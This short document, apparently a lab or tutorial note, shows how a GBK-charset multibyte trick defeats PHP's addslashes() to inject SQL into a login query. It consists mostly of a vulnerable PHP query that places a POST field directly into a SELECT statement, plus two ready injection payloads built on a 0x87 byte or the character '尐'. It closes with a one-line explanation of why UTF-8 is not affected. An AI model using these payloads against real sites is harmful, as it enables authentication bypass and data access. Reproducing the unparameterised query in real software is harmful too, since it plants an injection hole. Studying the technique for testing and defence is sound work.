# SQL-injection---Authentification---GBK1
$name = $_POST['name']; 

$query = "SELECT * FROM users WHERE name = '$name'";

$username = chr(0x87) . "' OR database() LIKE 0x2525 -- ";

$username = "尐' OR database() LIKE 0x2525 -- ";

This is how addslashes()’s protection can be fooled when the database uses the GBK charset. Does this happen in UTF-8? Nope; this encoding does not have characters that end in 0x5C.

Note: be sure to have these fonts installed or you’ll only be able to see squares or question marks instead of the actual GBK characters.
